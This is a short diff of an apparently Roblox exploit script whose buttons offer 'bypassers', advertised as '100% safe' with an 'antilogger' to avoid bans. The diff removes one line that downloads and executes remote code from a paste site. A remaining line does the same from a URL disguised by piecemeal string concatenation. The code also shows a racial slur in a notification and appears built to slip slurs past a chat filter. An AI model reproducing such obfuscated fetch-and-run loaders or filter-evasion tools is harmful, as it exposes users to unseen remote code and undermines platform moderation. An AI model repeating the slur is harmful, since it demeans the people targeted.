@@ -1223,8 +1223,7 @@ FunSection:NewButton("Explikit Bypasser🔞(100% safe)", "has an antilogger so u
   Library:Notification({
   Text = "loaded! have fun nigger",
   Duration = 3
-  })--hookbelowforexplikitbypasser
-loadstring(game:HttpGet("https://textbin.net/raw/uhnqzkvywq",true))()
+  })--hookinside
 end)
 FunSection:NewButton("NGA Bypasser(100% safe)", "has an antilogger so u will not be banned", function()--ngabypasser
 loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'J'..'h'..'8'..'r'..'s'..'l'..'a'..'5'..'/'..'r'..'a'..'w'), true))()
